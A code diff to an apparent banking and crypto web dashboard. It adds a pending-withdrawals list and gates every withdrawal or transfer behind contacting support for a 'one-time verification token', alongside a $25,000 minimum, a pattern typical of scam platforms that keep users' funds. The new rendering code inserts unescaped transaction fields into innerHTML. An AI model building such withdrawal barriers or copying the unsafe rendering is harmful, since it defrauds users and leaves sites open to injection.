@@ -1984,6 +1984,23 @@
             </div>
 
 
+            <!-- pending withdrawals awaiting one-time token / review -->
+            <div class="sub-heading">Pending withdrawals</div>
+
+            <div class="activity" id="pendingWithdrawals">
+
+              <div class="activity-head">
+                <span>Request</span>
+                <span>Date</span>
+                <span>Status</span>
+                <span>Amount</span>
+              </div>
+
+              <div id="pendingWithdrawalsList"></div>
+
+            </div>
+
+
             <!-- shared: recent activity -->
             <div class="sub-heading">Recent activity</div>
 
@@ -4278,11 +4295,58 @@ const { data, error } = await supabaseClient.auth.signUp({
 
 
       renderTransactions(state);
+      renderPendingWithdrawals(state);
 
     }
 
 
-        function renderTransactions(state) {
+        function renderPendingWithdrawals(state) {
+
+      const listEl = document.getElementById("pendingWithdrawalsList");
+      if (!listEl) return;
+
+
+      const pending = state.transactions.filter(function(t) {
+        return t.pending === true;
+      });
+
+
+      if (!pending.length) {
+
+        listEl.innerHTML =
+          '<div class="activity-row">' +
+            "<strong>No pending withdrawals</strong>" +
+            "<span>—</span>" +
+            '<span class="pending">—</span>' +
+            "<strong>—</strong>" +
+          "</div>";
+
+        return;
+
+      }
+
+
+      listEl.innerHTML = pending
+        .slice()
+        .reverse()
+        .map(function(tx) {
+
+          return (
+            '<div class="activity-row">' +
+              "<strong>" + tx.description + "</strong>" +
+              "<span>" + tx.date + "</span>" +
+              '<span class="pending">' + tx.status + "</span>" +
+              "<strong>" + tx.amountLabel + "</strong>" +
+            "</div>"
+          );
+
+        })
+        .join("");
+
+    }
+
+
+    function renderTransactions(state) {
 
       const txList = document.getElementById("txList");
 
@@ -4424,7 +4488,12 @@ const { data, error } = await supabaseClient.auth.signUp({
 
       if (crypto && type === "withdraw") {
         document.getElementById("actionSubtitle").textContent =
-          "Enter your withdrawal details below. Minimum withdrawal: $25,000 — no maximum.";
+          "Enter your withdrawal details below. Minimum withdrawal: $25,000 — no maximum. After submitting, contact support for a one-time verification token to begin processing.";
+      }
+
+      if (!crypto && (type === "withdraw" || type === "transfer" || type === "send")) {
+        document.getElementById("actionSubtitle").textContent = t[1] +
+          " After submitting, you will be directed to contact support for a one-time verification token. Your funds stay pending until the token is verified and the request is reviewed.";
       }
 
       // Method select — hidden for crypto internal transfers and support-only funding
@@ -4482,6 +4551,7 @@ const { data, error } = await supabaseClient.auth.signUp({
         methodSelect.innerHTML =
           "<option>Bank transfer (ACH)</option>" +
           "<option>Wire transfer</option>" +
+          "<option>Transfer to Crypto Account (Internal)</option>" +
           "<option>Bitcoin (BTC)</option>" +
           "<option>Ethereum (ETH)</option>" +
           "<option>USDC (ERC-20)</option>";
@@ -4546,6 +4616,11 @@ const { data, error } = await supabaseClient.auth.signUp({
       if (type === "fund") {
         const target = depositMap[method];
         if (target) document.getElementById(target).classList.remove("hidden");
+        return;
+      }
+
+      // Online Banking internal withdrawal → move funds to the user's crypto account
+      if (method === "Transfer to Crypto Account (Internal)") {
         return;
       }
 
@@ -4749,6 +4824,7 @@ const { data, error } = await supabaseClient.auth.signUp({
       });
       if (!tx || tx.status === status) return;
       tx.status = status;
+      tx.pending = (status.indexOf("Pending") === 0);
       saveAllAccountState(all);
       renderDashboard(currentUser);
       if (document.getElementById("privateDashboard").classList.contains("show")) {
@@ -4932,6 +5008,7 @@ const { data, error } = await supabaseClient.auth.signUp({
           amount: amount,
           type: "withdraw",
           requestId: req.id,
+          pending: true,
           queuedAt: now.toISOString()
         });
         saveAccountState(currentUser, state);
@@ -4965,7 +5042,10 @@ const { data, error } = await supabaseClient.auth.signUp({
 
         let destination;
         let requestMethod = method;
-        if (internalCryptoTransfer) {
+        if (method === "Transfer to Crypto Account (Internal)") {
+          destination = { account_type: "digital_assets", source_account: from };
+          requestMethod = "Internal transfer to Digital Assets";
+        } else if (internalCryptoTransfer) {
           destination = { account_type: "digital_assets", source_account: from };
           requestMethod = "Internal transfer to Digital Assets";
         } else if (type === "withdraw" &&
@@ -5020,6 +5100,7 @@ const { data, error } = await supabaseClient.auth.signUp({
           amount: amount,
           type: type,
           requestId: req.id,
+          pending: true,
           queuedAt: now.toISOString()
         });
         saveAccountState(currentUser, state);
